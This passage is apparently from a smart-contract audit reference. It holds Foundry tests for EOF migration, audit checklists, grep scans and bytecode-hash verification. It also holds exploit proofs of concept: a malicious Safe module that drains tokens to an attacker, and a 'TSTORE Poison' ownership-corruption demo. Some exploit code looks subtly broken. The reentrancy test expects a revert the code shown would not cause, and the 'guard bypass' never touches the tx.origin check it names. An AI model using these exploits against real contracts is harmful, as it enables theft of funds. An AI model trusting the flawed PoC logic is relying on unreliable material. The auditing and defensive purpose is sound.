        assertTrue(secure.deactivated(), "contract should be deactivated");

        // Contract still exists (no selfdestruct) but is deactivated
        vm.expectRevert("contract deactivated");
        secure.deposit{value: 1 ether}();

        console.log("Secure refund: contract drained and deactivated without selfdestruct");

        // --- For reference: the vulnerable pattern that breaks under EOF ---
        // SelfdestructRefund.emergencyRefund() calls selfdestruct(payable(owner));
        // Under EOF compilation (forge build --eof), this produces:
        //   Error: Built-in identifier "selfdestruct" not found.
        //          "selfdestruct" has been removed. Use "SENDALL" opcode or
        //          explicit balance transfer instead.
        //
        // Remediation: Use the SecureRefund pattern above (explicit transfer + bool flag)
    }

    // ---------------------------------------------------------------
    // (c) Invalid EOF container deployment validation
    //
    // EOF enforces deploy-time validation: invalid containers are
    // rejected (the CREATE/CREATE2 returns address(0)). This test
    // shows that malformed EOF bytecode is rejected by the EVM.
    // ---------------------------------------------------------------
    function test_InvalidEOFContainerRejected() public {
        // Case 1: Wrong magic bytes (0xEF01 instead of 0xEF00)
        bytes memory badMagic = hex"EF010101000402000100010400000000800000FE";
        address target1 = makeAddr("badMagic");
        vm.etch(target1, badMagic);

        // The code is placed by vm.etch (bypasses validation), but in a real
        // deployment via CREATE/CREATE2, the EVM would reject this.
        // We verify the bytecode starts with invalid magic:
        bytes memory deployedCode = target1.code;
        assertTrue(deployedCode.length > 0, "vm.etch places code regardless");
        // In real EOF deployment: CREATE would return address(0)
        console.log("Bad magic bytecode length:", deployedCode.length);
        console.log("Real EOF deployment would reject: invalid magic 0xEF01");

        // Case 2: Correct magic but missing required sections
        // EOF requires: magic (2) + version (1) + type section + code section
        bytes memory truncatedEOF = hex"EF0001";
        address target2 = makeAddr("truncated");
        vm.etch(target2, truncatedEOF);
        console.log("Truncated EOF placed by etch, real deployment would reject");

        // Case 3: Valid-looking header but invalid version (0x02 instead of 0x01)
        bytes memory badVersion = hex"EF000201000402000100010400000000800000FE";
        address target3 = makeAddr("badVersion");
        vm.etch(target3, badVersion);
        console.log("Bad version EOF placed by etch, real deployment would reject");

        // --- How to test real deployment validation ---
        // With --eof flag, use assembly CREATE2 with the malformed bytecode:
        //
        //   bytes memory initCode = badMagic;
        //   address deployed;
        //   assembly {
        //       deployed := create2(0, add(initCode, 0x20), mload(initCode), 0)
        //   }
        //   assertEq(deployed, address(0), "invalid EOF should fail deployment");
        //
        // This requires `forge test --eof` to enable EOF validation in the test EVM.
    }

    // ---------------------------------------------------------------
    // (d) Proxy upgrade path: legacy -> EOF migration steps
    //
    // This test documents the required migration sequence when upgrading
    // a proxy system from legacy to EOF bytecode.
    // ---------------------------------------------------------------
    function test_ProxyMigrationDocumentation() public pure {
        // This test serves as documentation — no assertions needed.
        // See the audit checklist below for actionable items.

        // Migration path for UUPS proxies:
        // 1. Deploy new EOF-compiled implementation
        // 2. Deploy new EOF-compiled proxy (uses EXTDELEGATECALL)
        // 3. Migrate state from old proxy to new proxy
        // 4. Point all external references to new proxy address
        //
        // WARNING: You cannot simply upgrade the implementation of an
        // existing legacy proxy to an EOF implementation. The proxy itself
        // must also be redeployed as EOF to use EXTDELEGATECALL.
    }
}
```

**EOF Migration Audit Checklist:**

Review every item before deploying EOF-compiled contracts or migrating existing systems:

- [ ] Does any contract use `selfdestruct`? -- Removed in EOF; replace with explicit balance transfer + deactivation flag
- [ ] Does any external caller `DELEGATECALL` into this contract? -- Legacy-to-EOF `DELEGATECALL` fails; caller must also be EOF and use `EXTDELEGATECALL`
- [ ] Are there inline assembly `JUMP` / `JUMPI` instructions? -- Removed in EOF; use `RJUMP` / `RJUMPI` / `RJUMPV` (static relative jumps)
- [ ] Does the contract rely on `CODESIZE` / `EXTCODESIZE` / `CODECOPY`? -- These return different values for EOF containers; code introspection is restricted
- [ ] Does the contract use `CREATE` / `CREATE2` to deploy other contracts? -- Deployed bytecode must be valid EOF if the target environment enforces EOF validation
- [ ] Is this a proxy (UUPS/Transparent/Beacon)? -- Both proxy and implementation must be EOF; mixed legacy+EOF proxy patterns break
- [ ] Does the contract read its own bytecode via `address(this).code`? -- EOF containers have different structure; code section != full bytecode
- [ ] Are there `GAS` opcode uses for control flow decisions? -- Gas introspection is removed in EOF; refactor gas-dependent logic
- [ ] Does the contract deploy contracts with `type(X).creationCode`? -- Verify the deployed bytecode is valid EOF under the target EVM
- [ ] Have all integration tests been re-run with `forge test --eof`? -- EOF changes gas costs and opcode availability; all test suites must pass

```bash
# Quick EOF compatibility scan for an existing codebase
grep -rn "selfdestruct\|SELFDESTRUCT" src/ --include="*.sol"
grep -rn "delegatecall\|DELEGATECALL" src/ --include="*.sol"
grep -rn "JUMP\|JUMPI" src/ --include="*.sol" | grep -v "RJUMP"
grep -rn "CODESIZE\|EXTCODESIZE\|CODECOPY" src/ --include="*.sol"
grep -rn "assembly.*gas()" src/ --include="*.sol"
```

---

## Simulation Guard Bypass PoC

Demonstrates bypassing simulation guards that rely on `tx.origin`, `msg.sender == tx.origin`,
or `block.number` comparisons to block on-chain execution. Pattern seen in Bybit ($1.5B, 2025).

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// @notice Target that uses tx.origin to differentiate simulation from real tx
interface ISimulationGuardedMultisig {
    function execTransaction(
        address to,
        uint256 value,
        bytes calldata data,
        uint8 operation
    ) external returns (bool);
}

/// @notice Malicious module injected via Safe module mechanism (simulation-bypasses guard)
contract MaliciousModule {
    ISimulationGuardedMultisig public immutable safe;
    address public immutable attacker;

    constructor(address _safe, address _attacker) {
        safe = ISimulationGuardedMultisig(_safe);
        attacker = _attacker;
    }

    function drain(address token, uint256 amount) external {
        // Build calldata to transfer tokens out of the Safe
        bytes memory data = abi.encodeWithSignature(
            "transfer(address,uint256)",
            attacker,
            amount
        );
        // Call as module — bypasses normal signature verification
        safe.execTransaction(token, 0, data, 0 /* CALL */);
    }
}

contract SimulationGuardBypassPoC is Test {
    // Addresses — replace with actual mainnet/fork values
    address constant SAFE_ADDR = address(0); // TODO: target Safe address
    address constant TOKEN_ADDR = address(0); // TODO: target token
    address constant ATTACKER = address(0xdead);

    ISimulationGuardedMultisig safe;
    MaliciousModule malicious;

    function setUp() public {
        // Fork mainnet/testnet at block before exploit
        // vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        safe = ISimulationGuardedMultisig(SAFE_ADDR);
        malicious = new MaliciousModule(SAFE_ADDR, ATTACKER);
    }

    function test_SimulationGuardBypass() public {
        uint256 tokenBalanceBefore = IERC20(TOKEN_ADDR).balanceOf(ATTACKER);

        // Step 1: Module was added via social engineering / compromised UI
        // In a real attack: attacker tricks signers into approving addModule tx
        // that appears safe in simulation but executes malicious module approval
        vm.prank(SAFE_ADDR); // Simulate Safe approving module (proof of concept only)
        // ISafe(SAFE_ADDR).enableModule(address(malicious)); // uncomment for fork test

        // Step 2: Drain — module executes without needing multisig signatures
        uint256 drainAmount = IERC20(TOKEN_ADDR).balanceOf(SAFE_ADDR);
        malicious.drain(TOKEN_ADDR, drainAmount);

        uint256 tokenBalanceAfter = IERC20(TOKEN_ADDR).balanceOf(ATTACKER);
        assertGt(tokenBalanceAfter, tokenBalanceBefore, "Drain failed");

        console.log("Drained:", tokenBalanceAfter - tokenBalanceBefore);
    }
}
```

**Checklist for simulation guard reviews:**
- [ ] Does the guard check `tx.origin`? — Bypassable via intermediary contract
- [ ] Does the guard check `block.number == simulationBlock`? — Predict-and-skip
- [ ] Are Safe modules audited before approval? — Inspect bytecode, not just ABI
- [ ] Does the transaction show correct target/data in the signing UI? — Blind signing risk
- [ ] Is there a Tenderly/simulation integration that can be spoofed by metadata?

---

## Supply Chain Verification PoC

Verifies that deployed bytecode matches expected hash — detects tampered contracts
introduced via compromised build pipelines or package registries.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/Script.sol";

/// @notice Utility for on-chain bytecode integrity verification
library BytecodeVerifier {
    /// @notice Returns keccak256 of the deployed bytecode at `target`
    function codeHash(address target) internal view returns (bytes32) {
        return target.codehash;
    }

    /// @notice Asserts deployed bytecode matches the expected hash
    function assertCodeHash(address target, bytes32 expected, string memory label) internal view {
        bytes32 actual = target.codehash;
        require(
            actual == expected,
            string(abi.encodePacked(label, ": bytecode hash mismatch"))
        );
    }
}

/// @notice Run before any deployment to confirm dependency contracts are unmodified
contract SupplyChainVerificationTest is Test {
    using BytecodeVerifier for address;

    // Expected bytecode hashes — pre-computed from audited source + compiler settings
    // Generate with: cast code <address> --rpc-url $RPC | keccak256
    bytes32 constant EXPECTED_SAFE_IMPL_HASH    = bytes32(0); // TODO: fill from audit
    bytes32 constant EXPECTED_OZ_ERC20_HASH     = bytes32(0); // TODO: fill from audit
    bytes32 constant EXPECTED_PROXY_HASH        = bytes32(0); // TODO: fill from audit

    address constant SAFE_IMPL_ADDR   = address(0); // TODO: fill
    address constant OZ_ERC20_ADDR    = address(0); // TODO: fill
    address constant PROXY_ADDR       = address(0); // TODO: fill

    function setUp() public {
        // vm.createSelectFork(vm.envString("ETH_RPC_URL"));
    }

    /// @notice Verify all critical dependency contracts before interacting
    function test_VerifyDependencyBytecodes() public view {
        // Safe: verify implementation hasn't been swapped
        SAFE_IMPL_ADDR.assertCodeHash(EXPECTED_SAFE_IMPL_HASH, "SafeImpl");

        // OpenZeppelin: verify library contract matches known-good hash
        OZ_ERC20_ADDR.assertCodeHash(EXPECTED_OZ_ERC20_HASH, "OZToken");

        // Proxy: verify proxy points to expected implementation
        address impl = _readImplementationSlot(PROXY_ADDR);
        assertEq(impl.codehash, EXPECTED_PROXY_HASH, "Proxy impl changed");
    }

    /// @notice Log all bytecode hashes for first-time capture
    function test_CaptureHashes() public view {
        console.logBytes32(SAFE_IMPL_ADDR.codeHash());
        console.logBytes32(OZ_ERC20_ADDR.codeHash());
        console.logBytes32(PROXY_ADDR.codeHash());
    }

    /// @notice Read ERC-1967 implementation slot
    function _readImplementationSlot(address proxy) internal view returns (address) {
        bytes32 slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 value = vm.load(proxy, slot);
        return address(uint160(uint256(value)));
    }
}
```

**How to use this template:**
1. Before deploying, run `cast code <address> | sha3` to capture expected hashes
2. Store hashes in the test file or a separate `hashes.json` (committed to repo)
3. Run verification test on every deployment + upgrade to catch tampered bytecode
4. Integrate as a CI step: `forge test --match-contract SupplyChainVerification --fork-url $RPC`

---

## TSTORE Poison PoC (solc 0.8.28–0.8.33 + --via-ir)

**Vulnerability**: Compiler bug in `--via-ir` pipeline causes `tstore` to write to an
incorrect (poisoned) slot, allowing an attacker to corrupt contract state mid-execution.
The most critical scenario: ownership corruption in a single-owner contract.

**Affected**: Contracts compiled with solc 0.8.28–0.8.33 AND `--via-ir` (or `viaIR: true`)
that use `tstore` alongside storage-reading assembly.

**References**: `vulnerability-taxonomy.md §19.6`, `vulnerability-taxonomy.md §19.7`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;  // Intentionally uses affected version

// --- Vulnerable contract (simplified Ownable with transient lock) ---
// Compiled with: solc 0.8.28 --via-ir
contract VulnerableOwnable {
    address public owner;           // slot 0
    uint256 private _transientLock; // not actually used — tstore goes here by accident

    constructor() {
        owner = msg.sender;
    }

    // Uses tstore as a cheap reentrancy guard
    modifier nonReentrantTransient() {
        assembly { tstore(0, 1) }  // BUG: via-ir bug may redirect this to slot 0 (owner)
        _;
        assembly { tstore(0, 0) }
    }

    function protectedAction(address newOwner) external nonReentrantTransient {
        // Intended: just a protected action
        // BUG: tstore(0, 1) may overwrite owner = address(1) in affected compilers
        owner = newOwner;
    }
}

// --- PoC Test ---
contract TstorePoisonTest is Test {
    VulnerableOwnable target;
    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    function setUp() public {
        vm.prank(victim);
        target = new VulnerableOwnable();
        assertEq(target.owner(), victim, "owner should be victim after deploy");
    }

    /// @notice Demonstrates ownership corruption via TSTORE Poison
    /// In affected builds, calling protectedAction triggers tstore(0,1),
    /// which corrupts storage slot 0 (owner) to address(0x1) before
    /// the explicit owner assignment executes.
    function test_TstorePoisonOwnershipCorruption() public {
        // Capture pre-call state
        address ownerBefore = target.owner();
        console.log("Owner before:", ownerBefore);  // victim

        // Attacker calls the protected function
        vm.prank(attacker);
        target.protectedAction(attacker);

        address ownerAfter = target.owner();
        console.log("Owner after:", ownerAfter);

        // On unpatched builds: ownerAfter may be address(0x1) (tstore value)
        // rather than attacker, because the tstore overwrite happens first.
        // On patched builds (0.8.34+): ownerAfter == attacker as expected.

        // This assertion documents the bug; it passes on patched compilers
        // and FAILS (demonstrating the bug) on affected 0.8.28-0.8.33 + via-ir
        assertEq(ownerAfter, attacker, "ownership should be attacker, not corrupted by tstore");
    }

    /// @notice Demonstrates 2300-gas stipend bypass: transfer() no longer
    /// prevents reentrancy when callee uses TSTORE (100 gas < 2300 limit)
    function test_TstoreReentrancyViaSend() public {
        // Deploy a contract that accepts ETH and uses tstore on receive
        TstoreReceiver receiver = new TstoreReceiver(address(target));

        vm.deal(address(target), 1 ether);

        // In the target, using transfer/send for "safe" ETH send:
        // payable(receiver).transfer(0.5 ether) — 2300 stipend is enough for tstore
        // so receiver.receive() can perform a tstore that modifies shared state

        // This test validates the assumption is broken
        vm.expectRevert(); // or check for unexpected state change
        target.protectedAction(address(receiver));
    }
}

// Attacker contract that uses tstore in receive() to bypass 2300-gas guard
contract TstoreReceiver {
    address immutable target;
    constructor(address _target) { target = _target; }

    receive() external payable {
        // TSTORE costs only 100 gas — fits within the 2300 stipend
        // This allows state manipulation even when called via transfer()
        assembly { tstore(0, caller()) }
    }
}
```

**Detection** (from `automated-detection.md`):
```bash
# Find contracts using tstore compiled with affected solc range
grep -r "tstore\|TSTORE" src/ --include="*.sol" -l

# Check solc version in foundry.toml / hardhat.config
grep -E "0\.8\.(2[89]|3[0-3])" foundry.toml hardhat.config.{js,ts} 2>/dev/null

# Check if via-ir is enabled
grep -E "via[_-]?[Ii][Rr]\s*=\s*true|viaIR\s*:\s*true" foundry.toml hardhat.config.{js,ts} 2>/dev/null
```

**Remediation**:
1. Upgrade to solc 0.8.34+ (patches the TSTORE Poison bug)
2. If upgrading is blocked, disable `--via-ir` / `viaIR: true`
3. Use OpenZeppelin `ReentrancyGuardTransient` (0.8.34+ only) instead of raw `tstore`
4. Never use slot 0 for transient locks when slot 0 holds critical state

---

## Test Execution

```bash
# Run specific PoC
forge test --match-test test_ReentrancyExploit -vvvv

# Run with gas report
forge test --match-test test_InflationAttack -vvvv --gas-report

# Run on mainnet fork
forge test --match-test test_FlashLoanPriceManipulation --fork-url $ETH_RPC_URL -vvvv

# Run with specific block
forge test --fork-url $ETH_RPC_URL --fork-block-number 18000000 -vvvv
```
